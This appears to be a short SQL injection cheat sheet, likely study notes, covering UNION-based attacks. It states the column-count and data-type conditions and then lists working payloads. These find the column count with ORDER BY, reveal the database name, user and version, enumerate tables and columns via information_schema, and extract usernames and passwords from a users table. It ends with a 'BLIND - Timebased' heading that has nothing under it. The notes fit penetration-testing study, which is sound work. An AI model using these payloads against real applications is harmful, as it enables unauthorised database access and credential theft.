UNION Based

For UNION SQLi attacks to work, we first need to satisfy two conditions:
  The injected UNION query has to include the same number of columns as the original query.
  The data types need to be compatible between each column.

' ORDER BY 1-- //  #test number until you a message that column is unknown
' UNION SELECT null, null, database(), user(), @@version  -- //   #use null as payload 
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

BLIND - Timebased
